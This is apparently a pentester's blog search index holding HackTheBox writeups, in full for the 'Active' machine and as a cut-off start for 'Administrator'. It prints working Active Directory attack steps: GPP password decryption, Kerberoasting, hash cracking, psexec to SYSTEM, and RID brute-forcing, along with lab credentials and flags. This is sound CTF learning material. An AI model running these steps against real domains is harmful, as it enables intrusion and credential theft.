{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#welcome-fellow-curious-minds","title":"Welcome, fellow curious minds!","text":"<p>You\u2019ve stumbled into my little corner of the internet where firewalls fear me, logs tremble, and I generously share my long journey towards pentesting so you don\u2019t have to make the same mistakes I did\u2014lucky you. Here, you\u2019ll find writeups, tutorials, and ramblings from my adventures, sprinkled with just enough chaos to keep things interesting.</p> <p>Disclaimer: Every writeup was fueled by caffeine and questionable confidence, don\u2019t try this at home.</p>"},{"location":"#hackthebox-writeups","title":"HackTheBox Writeups","text":"Machine OS Difficulty Progress / Tags Writeup Forest Windows Easy \u2705 NotAssumedBreach AS-REP-roasting \u2705 Cascade Windows Medium \u2705 NotAssumedBreach RecycleBin codereview \u2705 Flight Windows Hard \u2705 NotAssumedBreach WebApp PortForwarding Impersonation DCSync WinPEAS \u2705 Fluffy Windows Easy \u2705 AssumedBreach certificates ESC16 shadowcredential \u2705 Puppy Windows Medium \u2705 AsummedBreach DCSync ADdisabledaccount \u2705 Blackfield Windows Hard \u2705 NotAssumedBreach PrivGroupAbuse \u2705 Administrator Windows Medium \u2705 AsummedBreach Kerberoasting DCSync \u2705 Escapetwo Windows Easy \u2705 AssumedBreach certificates certvulntemplate \u2705 Return Windows Easy \u2705 NotAssumedBreach WebApp PrivGroupAbuse \u2705 Sauna Windows Easy \u2705 NotAssumedBreach DCSync WinPEAS \u2705 Active Windows Easy \u2705 NotAssumedBreach Kerberoasting \u2705 Monteverde Windows Medium \u2705 NotAssumedBreach ADconnectAbuse \u2705 Escape Windows Medium \u2705 NotAssumedBreach MSSQL certificates certvulntoESC1 \u2705 Cicada Windows Easy \u2705 NotAssumedBreach PrivGroupAbuse \u2705 Timelapse Windows Easy \u2705 NotAssumedBreach History LAPS \u2705 Tombwatcher Windows Medium \u2705 AssumedBreach certificates certvulntoESC15 RecycleBin \u2705 Imagery Linux Medium \u2705 \u2705 Dog Linux Easy \u2705 \ud83d\udee0\ufe0f in progress Scepter Windows Hard \u2705 \ud83d\udee0\ufe0f in progress Cat Linux Medium \u2705 \ud83d\udee0\ufe0f in progress Code Linux Easy \u2705 \ud83d\udee0\ufe0f in progress TheFrizz Windows Medium \u2705 NotAssumedBreach GSSAPIauthentication GPO \u2705 Nocturnal Linux Easy \u2705 commandinjection codereview PortForwarding \u2705 Expressway Linux Easy \u2705 \ud83d\udee0\ufe0f in progress"},{"location":"#other-ctf-writeups","title":"Other CTF Writeups","text":"Machine OS Difficulty Progress / Tags Writeup Portfolio Linux - \u2705 WebApp XSS RCE Docker \u2705"},{"location":"AD/","title":"AD","text":"<p>AD.md</p>"},{"location":"ADconnectAbuse/","title":"ADconnectAbuse","text":"<p>ADconnectAbuse.md</p>"},{"location":"AS-REP-roasting/","title":"AS-REP-roasting","text":"<p>AS-REP-roasting.md</p>"},{"location":"AssumedBreach/","title":"AssumedBreach","text":"<p>AssumedBreach.md</p>"},{"location":"DCSync/","title":"DCSync","text":"<p>DCSync.md</p>"},{"location":"Docker/","title":"Docker","text":"<p>Docker.md</p>"},{"location":"GSSAPIauthentication/","title":"GSSAPIauthentication","text":"<p>GSSAPIauthentication.md</p>"},{"location":"Kerberoasting/","title":"Kerberoasting","text":"<p>Kerberoasting.md</p>"},{"location":"NotAssumedBreach/","title":"NotAssumedBreach","text":"<p>NotAssumedBreach.md</p>"},{"location":"OSCPpath/","title":"OSCPpath","text":"<p>OSCPpath.md</p>"},{"location":"PortForwarding/","title":"PortForwarding","text":"<p>PortForwarding.md</p>"},{"location":"PrivGroupAbuse/","title":"PrivGroupAbuse","text":"<p>PrivGroupAbuse.md</p>"},{"location":"RCE/","title":"RCE","text":"<p>RCE.md</p>"},{"location":"RecycleBin/","title":"RecycleBin","text":"<p>RecycleBin.md</p>"},{"location":"WebApp/","title":"WebApp","text":"<p>WebApp.md</p>"},{"location":"WinPEAS/","title":"WinPEAS","text":"<p>WinPEAS.md</p>"},{"location":"XSS/","title":"XSS","text":"<p>XSS.md</p>"},{"location":"certificates/","title":"certificates","text":"<p>certificates.md</p>"},{"location":"certvulntemplate/","title":"certvulntemplate","text":"<p>certvulntemplate.md</p>"},{"location":"ch3ckm8_HTB_Active/","title":"Active","text":""},{"location":"ch3ckm8_HTB_Active/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[Kerberoasting]] [[OSCPpath]]</p> <p>Tags: #windows #NotAssumedBreach #Kerberoasting #OSCPpath  Tools used: - GetUserSPNs.py (Kerberoasting) - Hashcat (cracking) - smbclient / smbmap / nxc (smb enumeration) - psexec.py (shell over smb) </p>"},{"location":"ch3ckm8_HTB_Active/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Active/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.171.121 active.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Active/#nmap-scan","title":"Nmap scan","text":"<p><pre><code>sudo nmap -sC -sV active.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-29 12:50 CDT\nNmap scan report for active.htb (10.129.171.121)\nHost is up (0.0073s latency).\nNot shown: 981 closed tcp ports (reset)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-29 17:50:38Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49163/tcp open  msrpc         Microsoft Windows RPC\n49167/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-07-29T17:51:36\n|_  start_date: 2025-07-29T17:48:26\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 69.07 seconds\n</code></pre> Multiple services are open, we could start with <code>SMB</code>, <code>RPC</code>, <code>LDAP</code> </p>"},{"location":"ch3ckm8_HTB_Active/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_Active/#smb-anonymous-logon","title":"SMB anonymous logon","text":"<pre><code>nxc smb active.htb  -u '' -p '' --shares\n</code></pre> <p><pre><code>SMB         10.129.171.121  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nSMB         10.129.171.121  445    DC               [+] active.htb\\: \nSMB         10.129.171.121  445    DC               [*] Enumerated shares\nSMB         10.129.171.121  445    DC               Share           Permissions     Remark\nSMB         10.129.171.121  445    DC               -----           -----------     ------\nSMB         10.129.171.121  445    DC               ADMIN$                          Remote Admin\nSMB         10.129.171.121  445    DC               C$                              Default share\nSMB         10.129.171.121  445    DC               IPC$                            Remote IPC\nSMB         10.129.171.121  445    DC               NETLOGON                        Logon server share\nSMB         10.129.171.121  445    DC               Replication     READ        \nSMB         10.129.171.121  445    DC               SYSVOL                          Logon server share\nSMB         10.129.171.121  445    DC               Users                   \n</code></pre> Hm the Share <code>Replication</code> is a non default share, lets explore it.</p> <p>download all shares <pre><code>nxc smb active.htb  -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True\n</code></pre></p> <p><pre><code>\u2514\u2500\u2500\u257c [\u2605]$ tree\n.\n\u251c\u2500\u2500 10.129.171.121\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Replication\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 active.htb\n\u2502\u00a0\u00a0         \u2514\u2500\u2500 Policies\n\u2502\u00a0\u00a0             \u251c\u2500\u2500 {31B2F340-016D-11D2-945F-00C04FB984F9}\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0 \u251c\u2500\u2500 GPT.INI\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0 \u251c\u2500\u2500 Group Policy\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 GPE.INI\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0 \u2514\u2500\u2500 MACHINE\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u251c\u2500\u2500 Microsoft\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 Windows NT\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2502\u00a0\u00a0     \u2514\u2500\u2500 SecEdit\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2502\u00a0\u00a0         \u2514\u2500\u2500 GptTmpl.inf\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u251c\u2500\u2500 Preferences\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 Groups\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2502\u00a0\u00a0     \u2514\u2500\u2500 Groups.xml\n\u2502\u00a0\u00a0             \u2502\u00a0\u00a0     \u2514\u2500\u2500 Registry.pol\n\u2502\u00a0\u00a0             \u2514\u2500\u2500 {6AC1786C-016F-11D2-945F-00C04fB984F9}\n\u2502\u00a0\u00a0                 \u251c\u2500\u2500 GPT.INI\n\u2502\u00a0\u00a0                 \u2514\u2500\u2500 MACHINE\n\u2502\u00a0\u00a0                     \u2514\u2500\u2500 Microsoft\n\u2502\u00a0\u00a0                         \u2514\u2500\u2500 Windows NT\n\u2502\u00a0\u00a0                             \u2514\u2500\u2500 SecEdit\n\u2502\u00a0\u00a0                                 \u2514\u2500\u2500 GptTmpl.inf\n\u2514\u2500\u2500 10.129.171.121.json\n\n18 directories, 8 files\n</code></pre> well the 2nd Policy <code>{6AC1786C-016F-11D2-945F-00C04fB984F9}</code> had no valuable info</p> <p>The 1st Policy tho, <code>{31B2F340-016D-11D2-945F-00C04FB984F9}</code> has an interesting folder: <code>Machine</code> and on Preferences&gt;Groups there is an <code>Groups.xml</code> file containing this: <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n&lt;/Groups&gt;\n</code></pre> and it appears to contain creds related to user <code>SVC_TGS</code> and sth like a password <code>cpassword</code>: <pre><code>SVC_TGS\nedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n</code></pre> after some research, this <code>cpassword</code> appears to be a <code>GPP password</code></p> <p>Lets find a tool to decrypt it <pre><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n</code></pre> the decryption was successful: <pre><code>GPPstillStandingStrong2k18\n</code></pre> Our update creds now are: <pre><code>SVC_TGS\nGPPstillStandingStrong2k18\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Active/#foothold","title":"Foothold","text":"<p>tried logging in with win-rm but no luck <pre><code>evil-winrm -i forest.htb -u svc_tgs -p \"GPPstillStandingStrong2k18\"\n</code></pre> hmm since we now have some creds, we can enumerate using them.</p>"},{"location":"ch3ckm8_HTB_Active/#smb-login-as-svc_tgs","title":"SMB login as <code>SVC_TGS</code>","text":"<pre><code>nxc smb active.htb  -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares\n</code></pre> <pre><code>SMB         10.129.171.121  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nSMB         10.129.171.121  445    DC               [+] active.htb\\\\\\\\SVC_TGS:GPPstillStandingStrong2k18\nSMB         10.129.171.121  445    DC               [*] Enumerated shares\nSMB         10.129.171.121  445    DC               Share           Permissions     Remark\nSMB         10.129.171.121  445    DC               -----           -----------     ------\nSMB         10.129.171.121  445    DC               ADMIN$                          Remote Admin\nSMB         10.129.171.121  445    DC               C$                              Default share\nSMB         10.129.171.121  445    DC               IPC$                            Remote IPC\nSMB         10.129.171.121  445    DC               NETLOGON        READ            Logon server share\nSMB         10.129.171.121  445    DC               Replication     READ\nSMB         10.129.171.121  445    DC               SYSVOL          READ            Logon server share\nSMB         10.129.171.121  445    DC               Users           READ\n</code></pre> <p>Lets inspect the ones that we have <code>READ</code> permissions: <pre><code>smbmap -H active.htb -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18\n</code></pre></p> <pre><code>[+] IP: active.htb:445  Name: unknown\nDisk                                                Permissions Comment\n----                                                ----------- -------\nADMIN$                                              NO ACCESS   Remote Admin\nC$                                                  NO ACCESS   Default share\nIPC$                                                NO ACCESS   Remote IPC\nNETLOGON                                            READ ONLY   Logon server share\nReplication                                         READ ONLY\nSYSVOL                                              READ ONLY   Logon server share\nUsers                                               READ ONLY\n</code></pre> <p>since we have access to <code>Users</code> lets go there first: <pre><code>smbclient //active.htb/Users -U active.htb\\\\\\\\\\\\\\\\SVC_TGS%GPPstillStandingStrong2k18\n</code></pre></p> <p>then just navigate to our user through smbclient: <pre><code>smb: \\\\\\\\SVC_TGS\\\\\\\\Desktop\\\\\\\\&gt; get user.txt\ngetting file \\\\\\\\SVC_TGS\\\\\\\\Desktop\\\\\\\\user.txt of size 34 as user.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)\n</code></pre> and grab the user flag! <code>98c543926be60d157e0440942b619323</code></p>"},{"location":"ch3ckm8_HTB_Active/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_Active/#kerberoasting","title":"Kerberoasting","text":"<p>Since we have access to a service account, what first comes to my mind is that is probably associated with an <code>SPN</code>, and that indicates that we can attempt <code>kerberoasting</code> <pre><code>GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.104.48 -save -outputfile GetUserSPNs.out\n</code></pre></p> <p>the above command will also save the ticket <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-08-01 20:07:37.328537\n</code></pre></p> <p>or we could use nxc for this: <pre><code>nxc ldap 10.129.104.48 -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting kerberoast_hash.txt\n</code></pre></p> <p>either way, the tgs hash obtained is the following <pre><code>SMB         10.129.104.48   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.104.48   389    DC               [+] active.htb\\\\SVC_TGS:GPPstillStandingStrong2k18\nLDAP        10.129.104.48   389    DC               Bypassing disabled account krbtgt\nLDAP        10.129.104.48   389    DC               [*] Total of records returned 1\nLDAP        10.129.104.48   389    DC               sAMAccountName: Administrator memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb pwdLastSet: 2018-07-18 14:06:40.351723 lastLogon:2025-08-01 20:07:37.328537\nLDAP        10.129.104.48   389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b1000e6ba68646261ad3504adaee11f5$63bd78bfc32a26cb3bb1e6cd1210357af23b9a5e5da2d8d6ae2688c051557d9615e0a0995ed4e99609cbd323b43c7e588f59015eb3d05d15714cc4485abd0c324961a488594fc9a84b2879946a47f5e57ed3bf39099d2eafa3d4e43ab4b705565be1b68a54c3aefd7b83e51a6ef989a13d47de119c3d6bce0f50f71f0ee93fb4f63a1d62185551b9000d800e846e41daa5a1bb7ad33fe67717991e097e2c5f8d088251127534d10c99defc881d33cc912a29ee13da3c7bcbd93e7cc10d82596df472ee981fbf11fa50df2cd6be85ae9795ebd6e7ba5514d398e48662c786568f2f70ff372f9486aefaaa123e6432564f100f881f6be0cbbb7203a37643695031800d2d68bef0a8d9e057f479097efc0a22259eebcb98ebe1d2ec0607aafd7b7c966a126f199a5a6eceb7ca75030b988a499164728d5da7421b53c778d3db46644e1f9deac5fc8275bb7a4d09e87f2f9c742857130c92226d93f9f97f738f9997f6544c8263cc16cccdc145f045432638bc07dd8fe938e3dde853a005340291af8faee53ea5a4cf3348b175ef764aa0cb071c1b19b3afe2aae4169d3a00d568a21b16073797b64d9c77c27a83a203676647460016fb084fdd27405679ae48176f3e0b17a750375667f7dafcea755e7adf9cffefc53a779042c350ff1e6bc5c43fd43484010eaf4e3dea93f2c1525263a5d5fb809e2ce994965fd773a79fdfa319d2b7b16907abe14d27c9607f1061c44b5fa3212a5c4fecc112f227f33431d2c25924879f3a4c51e5fadb0845185fdf84c275c2cd17219b361e0816a5e64c5ca0ebcb0f88588c18f368f9815953bb56a77a7073bd0c08564a054d7d0c6b707f8f6f8b62f0a8b1168a87a6b6a44d951424b2034f786fa26af738c5c7010baa3f85d560176f91c11b10eb53bd494e808e1819fba1029a3d4310121e17c48c82d483aa44ab8527671734f20ba764773a7e00aee0795a8ae8e4845a270e407416b42310d5f4bcf2b5e2030a7b56b6b3f58658097769dbb3a8bede6404ee74055a46770787efcf9dc3879730bb14ceaf086fc484a50ecbc6a8d031ccaf1c142921dfa1e9f7a83bec58eb6fa33c3dd511411223f5712e6712b674be28224fa5faa7d4bbdc84e29d239a4615d0cccff435a2ba53fd95d299303ad560a146e985269c62bcae8059f76e720cc86396366f098a3a0037fba0bd651a9a462afa4302cd2990d7c78acfea0e86799d2b41779afbb6d415ce85275356765351fb82\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Active/#cracking","title":"Cracking","text":"<p>got tgs hash of the <code>Administrator</code> ! lets <code>crack</code> it now offline: <pre><code>hashcat -m 13100 kerberoast_hash.txt -a 0 /home/ch3ckm8/my_data/rockyou.txt --force\n</code></pre></p> <p>after cracking the recovered password is: <pre><code>Ticketmaster1968\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Active/#smb-login-as-administrator","title":"SMB login as Administrator","text":"<p>lets now explore <code>smb shares</code> as administrator: <pre><code>smbmap -H 10.129.104.48 -d active.htb -u administrator -p Ticketmaster1968\n</code></pre></p> <pre><code>[+] IP: 10.129.104.48:445   Name: active.htb                                        \n\nDisk                                                Permissions Comment\n----                                                ----------- -------\nADMIN$                                              READ, WRITE Remote Admin\nC$                                                  READ, WRITE Default share\nIPC$                                                NO ACCESS   Remote IPC\nNETLOGON                                            READ, WRITE Logon server share \nReplication                                         READ ONLY   \nSYSVOL                                              READ, WRITE Logon server share \nUsers                                               READ ONLY\n</code></pre> <p>now lets navigate to those shares: <pre><code>smbclient //10.129.104.48/C$ -U active.htb\\\\\\\\administrator%Ticketmaster1968\n</code></pre></p> <p>grab root flag: <pre><code>get root.txt\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Active/#extras","title":"Extras","text":""},{"location":"ch3ckm8_HTB_Active/#getting-shell","title":"Getting shell","text":"<p>Furthermore, we could also get shell, and grab the flag from there too via <code>psexec</code>: <pre><code>psexec.py active.htb/administrator@10.129.104.48\n</code></pre></p> <p><pre><code>C:\\\\Windows\\\\system32&gt; whoami\nnt authority\\\\system\n\nC:\\\\Windows\\\\system32&gt; ipconfig\n\nWindows IP Configuration\n\nEthernet adapter Local Area Connection:\n\n   Connection-specific DNS Suffix  . : .htb\n   IPv6 Address. . . . . . . . . . . : dead:beef::59b5:3831:86d4:9231\n   Link-local IPv6 Address . . . . . : fe80::59b5:3831:86d4:9231%11\n   IPv4 Address. . . . . . . . . . . : 10.129.104.48\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11\n                                       10.129.0.1\n\nTunnel adapter isatap..htb:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : .htb\n\nC:\\\\Windows\\\\system32&gt; hostname\nDC\n</code></pre> pwned!</p>"},{"location":"ch3ckm8_HTB_Active/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_Active/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap <code>scan</code> -&gt; chose <code>SMB</code> to focus on first</li> <li><code>SMB anonymous</code> logon was successful, found creds for a user <code>svc_tgs</code></li> </ol>"},{"location":"ch3ckm8_HTB_Active/#foothold_1","title":"Foothold","text":"<ol> <li>got user flag by navigating via smbclient using those user's creds (svc_tgs)</li> </ol>"},{"location":"ch3ckm8_HTB_Active/#privesc_1","title":"Privesc","text":"<ol> <li>enumerated <code>SMB</code> using those user's creds (svc_tgs)</li> <li><code>Kerberoasting</code> was performed since we have one service account with an SPN, and obtained the <code>TGS hash</code> of the <code>Administrator</code> successfully</li> <li><code>cracking</code> the TGS hash revealed the Administrator's password</li> <li>enumerated <code>SMB</code> using those Administrator's creds, and by using smbclient navigated the shares and grabbed the root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Active/#extras_1","title":"Extras","text":"<ol> <li>the 4th step of the Privesc section above, could also be done via shell over smb utlizing<code>psexec</code></li> </ol>"},{"location":"ch3ckm8_HTB_Active/#sidenotes","title":"Sidenotes","text":"<p>This was a pretty easy machine, the only thing i would remember about it will be that inspection of smb shares should be thorough and extensive .</p> <p></p>"},{"location":"ch3ckm8_HTB_Administrator/","title":"Administrator","text":""},{"location":"ch3ckm8_HTB_Administrator/#intro","title":"Intro","text":"<p>This is a WINDOWS machine of medium difficulty, named Administrator, and our final goal is to become the admin of the system (no shit sherlock).  Without further ado, lets dive in!</p> <p> Machine Information: <pre><code>As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich, so its an assumed breach scenario\n</code></pre></p> <p>[[windows]] [[AD]] [[AssumedBreach]]  [[Kerberoasting]]  [[DCsync]] [[OSCPpath]]</p> <p>Tags: #windows #AD #AssumedBreach  #Kerberoasting  #DCsync #OSCPpath </p>"},{"location":"ch3ckm8_HTB_Administrator/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Administrator/#nmap-scan","title":"Nmap scan","text":""},{"location":"ch3ckm8_HTB_Administrator/#command","title":"command","text":"<pre><code>nmap -sSCV 10.10.11.42\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#usage-breakdown","title":"usage breakdown","text":"<p>the -sSCV parameter performs: <code>-sS</code> \u2192 Stealth SYN Scan (Half-Open Scan) <code>-sC</code> \u2192 Run Default NSE Scripts <code>-sV</code> \u2192 Version Detection</p>"},{"location":"ch3ckm8_HTB_Administrator/#output","title":"Output","text":"<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 17:28 EDT\nNmap scan report for 10.10.11.42\nHost is up (0.048s latency).\nNot shown: 987 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-27 04:28:21Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-03-27T04:28:28\n|_  start_date: N/A\n|_clock-skew: 6h59m57s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.78 seconds\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#add-machine-to-etc-hosts","title":"Add machine to etc hosts","text":"<pre><code>echo '10.10.11.42 Administrator.htb' | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#ftp","title":"FTP","text":"<p>okay, lets first try ftp with the given users creds,  after trying it i found out that user Olivia cant login to ftp, so lets move on to the rest of the open ports and their associated services</p> <p>(ch3ckm8)  (table) (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b</p> <p>narrator: no, no don't give up yet, its too early (try giving up later xd)</p>"},{"location":"ch3ckm8_HTB_Administrator/#smb-enumeration","title":"SMB enumeration","text":"<p>We are given (from the machine's description) creds for an account on that host, so lets use crackmapexec since smb service is available according to our nmap scan to enumerate the smb service</p> <pre><code>crackmapexec smb Administrator.htb -u \"Olivia\" -p \"ichliebedich\" --rid-brute | grep SidTypeUser\n</code></pre>"},{"location":"ch3ckm8_HTB_Administrator/#usage-breakdown_1","title":"usage breakdown:","text":""},{"location":"ch3ckm8_HTB_Administrator/#1-at-first-we-specify-the-known-users-creds","title":"1. At first we specify the known user's creds","text":""},{"location":"ch3ckm8_HTB_Administrator/#2-why-use-rid-brute","title":"2. why use <code>--rid-brute</code> ?","text":"<p>First, lets explain what is an rid, it stands for Relative identifier, and its a number assigned to objects upon creation, and user accounts are such objects.     So this parameter when used on crackmapexec, enumerates the rids in order to extract user and group accounts from a windows host.</p>"},{"location":"ch3ckm8_HTB_Administrator/#3-what-about-grep-sidtypeuser","title":"3. what about <code>grep SidTypeUser</code>?","text":"<p>This is used to \"filter\" only the user accounts on our command's output, and not information such as groups and other irrelevant (for now) information  </p> <p>--&gt; Overall, by using crackmapexec with the parameters mentioned below, we use a known user's creds (olivia) in order to \"log in\" and enumerate VALID users on the host.</p>"},{"location":"ch3ckm8_HTB_Administrator/#output_1","title":"Output","text":"<p>so the output we get looks sth like this, as we can see Olivia can login to winrm (in contrast with ftp) -&gt; what we actually see here, is that the domain is  the <code>administrator.htb</code>, along with every user and their respective RID <pre><code>SMB    administrator.htb 445    DC     500: ADMINISTRATOR\\Administrator (SidTypeUser)\nSMB    administrator.htb 445    DC     501: ADMINISTRATOR\\Guest (SidTypeUser)\nSMB    administrator.htb 445    DC     502: ADMINISTRATOR\\krbtgt (SidTypeUser)\nSMB    administrator.htb 445    DC     1000: ADMINISTRATOR\\DC$ (SidTypeUser)\nSMB    administrator.htb 445    DC     1108: ADMINISTRATOR\\olivia (SidTypeUser)\nSMB    administrator.htb 445    DC     1109: ADMINISTRATOR\\michael (SidTypeUser)\nSMB    administrator.htb 445    DC     1110: ADMINISTRATOR\\benjamin (SidTypeUser)\nSMB    administrator.htb 445    DC     1112: ADMINISTRATOR\\emily (SidTypeUser)\nSMB    administrator.htb 445    DC     1113: ADMINISTRATOR\\ethan (SidTypeUser)\nSMB    administrator.htb 445    DC     3601: ADMINISTRATOR\\alexander (SidTypeUser)\nSMB    administrator.htb 445    DC     3602: ADMINISTRATOR\\emma (SidTypeUser)\n</code></pre></p>"},{"location":"ch3ckm8_HTB_Administrator/#ad-enumeration","title":"AD enumeration","text":"<p>So, earlier we found the users, but we also need to collect (more) AD data from a domain controller (which is yet unknown) in a given domain (administrator.htb)</p>"},{"location":"ch3ckm8_HTB_Administrator/#command_1","title":"command","text":"<pre><code>bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 